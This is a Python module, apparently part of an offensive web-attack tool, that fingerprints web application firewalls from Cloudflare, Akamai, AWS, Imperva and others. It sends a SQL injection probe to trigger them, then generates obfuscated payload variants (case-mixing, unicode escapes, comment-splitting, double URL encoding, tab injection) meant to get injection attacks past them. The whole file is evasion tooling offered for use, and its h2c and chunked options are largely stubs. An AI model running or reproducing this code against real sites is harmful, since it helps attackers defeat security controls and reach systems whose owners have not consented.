"""
WAF Bypass — detects WAF presence and applies evasion strategies
in rotation: case-mixing, unicode, comment-splitting, h2c smuggling,
chunked transfer, tab/newline injection, double-encoding.
"""
from __future__ import annotations
import random
from core.encoder import Encoder
from core.logger import Logger

log = Logger.get_logger("waf")

WAF_SIGNATURES = {
    "Cloudflare":  ["cf-ray", "__cf_bm", "cloudflare"],
    "Akamai":      ["akamai", "reference #"],
    "AWS WAF":     ["awselb", "x-amzn-waf"],
    "F5 BIG-IP":   ["tsig", "bigipserver"],
    "Imperva":     ["incap_ses", "visid_incap"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Sucuri":      ["sucuri", "x-sucuri-cache"],
    "Fortinet":    ["fortiwafsid"],
}

class WAFBypass:
    def __init__(self, http, cfg):
        self.http = http
        self.cfg = cfg
        self.detected = None
        self.strategies = cfg.get("bypass_strategies", [])

    def detect(self, domain: str):
        if not self.cfg.get("detect", True): return
        # send a deliberately malicious probe to trigger WAF
        probe = f"http://{domain}/?id=1'+UNION+SELECT+NULL--"
        r = self.http.request("GET", probe)
        if not r: return
        body = (r.text or "").lower()
        hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}
        for name, sigs in WAF_SIGNATURES.items():
            if any(s in body or s in str(hdrs) for s in sigs):
                self.detected = name
                log.warn(f"WAF detected: {name}")
                return
        if r.status_code in (403, 406, 429, 503):
            self.detected = "Generic-WAF"
            log.warn(f"Possible WAF (status {r.status_code})")

    def evade(self, payload: str) -> list[str]:
        """Return a list of evaded variants of payload, ranked by likelihood."""
        variants = [payload]
        for strat in self.strategies:
            try:
                if strat == "case_mix":       variants.append(Encoder.case_mix(payload))
                elif strat == "unicode":      variants.append(Encoder.unicode_escape(payload))
                elif strat == "comment_split":variants.append(Encoder.comment_split(payload))
                elif strat == "tab_newline":  variants.append(Encoder.tab_newline_inject(payload))
                elif strat == "double_enc":   variants.append(Encoder.double_url(payload))
                elif strat == "h2c":          variants.append(payload.replace(" ", "\t"))
                elif strat == "chunked":
                    # split payload across chunked body (handled at request layer)
                    variants.append(payload)
            except Exception:
                continue
        random.shuffle(variants)
        return variants
